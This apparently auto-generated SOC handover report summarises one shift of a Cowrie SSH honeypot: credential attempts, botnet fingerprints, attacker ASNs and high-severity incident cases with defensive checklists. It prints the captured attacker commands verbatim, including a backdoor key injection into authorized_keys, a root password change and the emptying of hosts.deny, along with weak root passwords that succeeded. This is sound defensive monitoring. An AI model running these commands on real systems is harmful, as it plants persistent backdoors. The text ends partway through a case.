# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-31 |
| **Generated At** | 2026-05-31T15:20:06Z |
| **Shift Time** | 15:20 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **191** |
| Confirmed Threats | **185** |
| False Positives Filtered | **6** (3.1%) |
| Unique Attacker IPs | **24** |
| Countries of Origin | **12** |
| High Severity Cases | **29** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **162** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **72** |
| Unique Credential Pairs | **32** |
| Unique Usernames | **17** |
| Unique Passwords | **32** |
| Successful Auth Pairs | **20** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 31 |
| `345gs5662d34` | 13 |
| `satis` | 2 |
| `linuxbrew` | 2 |
| `user14` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 13 |
| `` | 2 |
| `satis123` | 2 |
| `123` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `root` | `3245gs5662d34` | 13 |
| `root` | `` | 2 |
| `satis` | `satis123` | 2 |
| `linuxbrew` | `123` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `hello101` | `167.172.203.111` | 2026-05-31T14:07:18 |
| `root` | `3245gs5662d34` | `167.172.203.111` | 2026-05-31T14:07:24 |
| `root` | `hello101` | `112.137.143.2` | 2026-05-31T14:08:52 |
| `root` | `3245gs5662d34` | `112.137.143.2` | 2026-05-31T14:08:57 |
| `root` | `user12345` | `112.137.143.2` | 2026-05-31T14:10:35 |
| `root` | `qwert123` | `61.151.249.194` | 2026-05-31T14:13:32 |
| `root` | `Passw0rd!` | `109.91.4.177` | 2026-05-31T14:17:52 |
| `root` | `3245gs5662d34` | `109.91.4.177` | 2026-05-31T14:17:56 |
| `root` | `w433iqoq` | `109.91.4.177` | 2026-05-31T14:18:42 |
| `root` | `google` | `109.91.4.177` | 2026-05-31T14:19:38 |
| `root` | `zaq1@WSX` | `109.91.4.177` | 2026-05-31T14:21:22 |
| `root` | `Admin@2023` | `109.91.4.177` | 2026-05-31T14:22:10 |
| `root` | `Ly123456` | `109.91.4.177` | 2026-05-31T14:22:55 |
| `root` | `zhang123` | `109.91.4.177` | 2026-05-31T14:23:42 |
| `root` | `Password123!` | `109.91.4.177` | 2026-05-31T14:24:27 |
| `root` | `user12345` | `167.172.203.111` | 2026-05-31T14:25:36 |
| `root` | `123456.com` | `40.82.214.8` | 2026-05-31T14:37:13 |
| `root` | `3245gs5662d34` | `40.82.214.8` | 2026-05-31T14:37:17 |
| `root` | `Wh123456` | `203.195.64.232` | 2026-05-31T14:50:06 |
| `root` | `root` | `45.125.66.98` | 2026-05-31T15:16:02 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **191** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 75 |
| Unknown | 2 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 47 | 5 |
| `af8223ac9914...` | libssh-based | 27 | 2 |
| `f1e5e9d24e5e...` | Mirai/variant | 1 | 1 |
| `51cba5712552...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 47 | 5 | Mirai/variant |
| `af8223ac9914...` | libssh | 27 | 2 | libssh-based |
| `95420f9d932d...` | Unknown | 2 | 1 | — |
| `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `51cba5712552...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:6cuYxQd9vIFV"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `203.195.64.232`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `112.137.143.2`, `167.172.203.111`, `109.91.4.177`, `40.82.214.8`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **24** |
| Unique ASNs | **17** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS25019` | Saudi Telecom Company JSC | 1 | LOW |
| `AS142002` | Scloud Pte Ltd | 1 | HIGH |
| `AS45542` | VietNam National University Ha Noi | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (29)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-fa7d5887bbc1

| Field | Detail |
|---|---|
| **Source IP** | `167.172.203[.]111` |
| **First Seen** | 2026-05-31 14:07 |
| **Last Seen** | 2026-05-31 14:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:07:16` | `cowrie.session.connect` |
| `2026-05-31 14:07:16` | `cowrie.client.version` |
| `2026-05-31 14:07:17` | `cowrie.client.kex` |
| `2026-05-31 14:07:18` | `cowrie.login.success` |
| `2026-05-31 14:07:18` | `cowrie.session.params` |
| `2026-05-31 14:07:18` | `cowrie.command.input` |
| `2026-05-31 14:07:18` | `cowrie.command.failed` |
| `2026-05-31 14:07:19` | `cowrie.log.closed` |
| `2026-05-31 14:07:19` | `cowrie.session.params` |
| `2026-05-31 14:07:19` | `cowrie.command.input` |
| `2026-05-31 14:07:19` | `cowrie.session.file_download` |
| `2026-05-31 14:07:19` | `cowrie.log.closed` |
| `2026-05-31 14:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.203[.]111` to AbuseIPDB if not already reported
- [ ] Block `167.172.203[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2cafd7d7714

| Field | Detail |
|---|---|
| **Source IP** | `167.172.203[.]111` |
| **First Seen** | 2026-05-31 14:07 |
| **Last Seen** | 2026-05-31 14:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:07:23` | `cowrie.session.connect` |
| `2026-05-31 14:07:23` | `cowrie.client.version` |
| `2026-05-31 14:07:23` | `cowrie.client.kex` |
| `2026-05-31 14:07:24` | `cowrie.login.success` |
| `2026-05-31 14:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.203[.]111` to AbuseIPDB if not already reported
- [ ] Block `167.172.203[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a60d582f211

| Field | Detail |
|---|---|
| **Source IP** | `112.137.143[.]2` |
| **First Seen** | 2026-05-31 14:08 |
| **Last Seen** | 2026-05-31 14:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:08:51` | `cowrie.session.connect` |
| `2026-05-31 14:08:51` | `cowrie.client.version` |
| `2026-05-31 14:08:51` | `cowrie.client.kex` |
| `2026-05-31 14:08:52` | `cowrie.login.success` |
| `2026-05-31 14:08:52` | `cowrie.session.params` |
| `2026-05-31 14:08:52` | `cowrie.command.input` |
| `2026-05-31 14:08:52` | `cowrie.command.failed` |
| `2026-05-31 14:08:53` | `cowrie.log.closed` |
| `2026-05-31 14:08:53` | `cowrie.session.params` |
| `2026-05-31 14:08:53` | `cowrie.command.input` |
| `2026-05-31 14:08:53` | `cowrie.session.file_download` |
| `2026-05-31 14:08:53` | `cowrie.log.closed` |
| `2026-05-31 14:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.137.143[.]2` to AbuseIPDB if not already reported
- [ ] Block `112.137.143[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a8638e32170

| Field | Detail |
|---|---|
| **Source IP** | `112.137.143[.]2` |
| **First Seen** | 2026-05-31 14:08 |
| **Last Seen** | 2026-05-31 14:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:08:56` | `cowrie.session.connect` |
| `2026-05-31 14:08:56` | `cowrie.client.version` |
| `2026-05-31 14:08:56` | `cowrie.client.kex` |
| `2026-05-31 14:08:57` | `cowrie.login.success` |
| `2026-05-31 14:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.137.143[.]2` to AbuseIPDB if not already reported
- [ ] Block `112.137.143[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a5964d424db

| Field | Detail |
|---|---|
| **Source IP** | `112.137.143[.]2` |
| **First Seen** | 2026-05-31 14:10 |
| **Last Seen** | 2026-05-31 14:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:10:34` | `cowrie.session.connect` |
| `2026-05-31 14:10:34` | `cowrie.client.version` |
| `2026-05-31 14:10:34` | `cowrie.client.kex` |
| `2026-05-31 14:10:35` | `cowrie.login.success` |
| `2026-05-31 14:10:35` | `cowrie.session.params` |
| `2026-05-31 14:10:35` | `cowrie.command.input` |
| `2026-05-31 14:10:35` | `cowrie.command.failed` |
| `2026-05-31 14:10:36` | `cowrie.log.closed` |
| `2026-05-31 14:10:36` | `cowrie.session.params` |
| `2026-05-31 14:10:36` | `cowrie.command.input` |
| `2026-05-31 14:10:36` | `cowrie.session.file_download` |
| `2026-05-31 14:10:36` | `cowrie.log.closed` |
| `2026-05-31 14:10:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.137.143[.]2` to AbuseIPDB if not already reported
- [ ] Block `112.137.143[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf47307d2a1e

| Field | Detail |
|---|---|
| **Source IP** | `112.137.143[.]2` |
| **First Seen** | 2026-05-31 14:10 |
| **Last Seen** | 2026-05-31 14:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:10:39` | `cowrie.session.connect` |
| `2026-05-31 14:10:39` | `cowrie.client.version` |
| `2026-05-31 14:10:39` | `cowrie.client.kex` |
| `2026-05-31 14:10:40` | `cowrie.login.success` |
| `2026-05-31 14:10:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.137.143[.]2` to AbuseIPDB if not already reported
- [ ] Block `112.137.143[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d583011477fa

| Field | Detail |
|---|---|
| **Source IP** | `61.151.249[.]194` |
| **First Seen** | 2026-05-31 14:13 |
| **Last Seen** | 2026-05-31 14:16 |
| **Session Duration** | 190s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:13:25` | `cowrie.session.connect` |
| `2026-05-31 14:13:25` | `cowrie.client.version` |
| `2026-05-31 14:13:25` | `cowrie.client.kex` |
| `2026-05-31 14:13:32` | `cowrie.login.success` |
| `2026-05-31 14:16:35` | `cowrie.session.params` |
| `2026-05-31 14:16:35` | `cowrie.command.input` |
| `2026-05-31 14:16:35` | `cowrie.command.failed` |
| `2026-05-31 14:16:35` | `cowrie.log.closed` |
| `2026-05-31 14:16:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.151.249[.]194` to AbuseIPDB if not already reported
- [ ] Block `61.151.249[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0d02ece1bb9

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-31 14:17 |
| **Last Seen** | 2026-05-31 14:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:17:52` | `cowrie.session.connect` |
| `2026-05-31 14:17:52` | `cowrie.client.version` |
| `2026-05-31 14:17:52` | `cowrie.client.kex` |
| `2026-05-31 14:17:52` | `cowrie.login.success` |
| `2026-05-31 14:17:53` | `cowrie.session.params` |
| `2026-05-31 14:17:53` | `cowrie.command.input` |
| `2026-05-31 14:17:53` | `cowrie.command.failed` |
| `2026-05-31 14:17:53` | `cowrie.log.closed` |
| `2026-05-31 14:17:53` | `cowrie.session.params` |
| `2026-05-31 14:17:53` | `cowrie.command.input` |
| `2026-05-31 14:17:53` | `cowrie.session.file_download` |
| `2026-05-31 14:17:53` | `cowrie.log.closed` |
| `2026-05-31 14:17:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98b04897a84c

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-31 14:17 |
| **Last Seen** | 2026-05-31 14:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:17:56` | `cowrie.session.connect` |
| `2026-05-31 14:17:56` | `cowrie.client.version` |
| `2026-05-31 14:17:56` | `cowrie.client.kex` |
| `2026-05-31 14:17:56` | `cowrie.login.success` |
| `2026-05-31 14:17:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f98a0ee7cea

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-31 14:18 |
| **Last Seen** | 2026-05-31 14:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:18:41` | `cowrie.session.connect` |
| `2026-05-31 14:18:41` | `cowrie.client.version` |
| `2026-05-31 14:18:42` | `cowrie.client.kex` |
| `2026-05-31 14:18:42` | `cowrie.login.success` |
| `2026-05-31 14:18:42` | `cowrie.session.params` |
| `2026-05-31 14:18:42` | `cowrie.command.input` |
| `2026-05-31 14:18:42` | `cowrie.command.failed` |
| `2026-05-31 14:18:43` | `cowrie.log.closed` |
| `2026-05-31 14:18:43` | `cowrie.session.params` |
| `2026-05-31 14:18:43` | `cowrie.command.input` |
| `2026-05-31 14:18:43` | `cowrie.session.file_download` |
| `2026-05-31 14:18:43` | `cowrie.log.closed` |
| `2026-05-31 14:18:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0fc7146d7df

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-31 14:18 |
| **Last Seen** | 2026-05-31 14:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:18:45` | `cowrie.session.connect` |
| `2026-05-31 14:18:45` | `cowrie.client.version` |
| `2026-05-31 14:18:45` | `cowrie.client.kex` |
| `2026-05-31 14:18:46` | `cowrie.login.success` |
| `2026-05-31 14:18:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf6aa87177bc

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-05-31 14:19 |
| **Last Seen** | 2026-05-31 14:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 14:19:38` | `cowrie.session.connect` |
| `2026-05-31 14:19:38` | `cowrie.client.version` |
| `2026-05-31 14:19:38` | `cowrie.client.kex` |
| `2026-05-31 14:19:38` | `cowrie.login.success` |
| `2026-05-31 14:19:39` | `cowrie.session.params` |
| `2026-05-31 14:19:39` | `cowrie.command.input` |
| `2026-05-31 14:19:39` | `cowrie.command.failed` |
| `2026-05-31 14:19:39` | `cowrie.log.closed` |
| `2026-05-31 14:19:39` | `cowrie.session.params` |
| `2026-05-31 14:19:39` | `cowrie.command.input` |
| `2026-05-31 14:19:39` | `cowrie.session.file_download` |
| `2026-05-31 14:19:39` | `cowrie.log.closed` |
| `2026-05-31 14:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bdf7410b406

| Field | Detail |
|---|---|
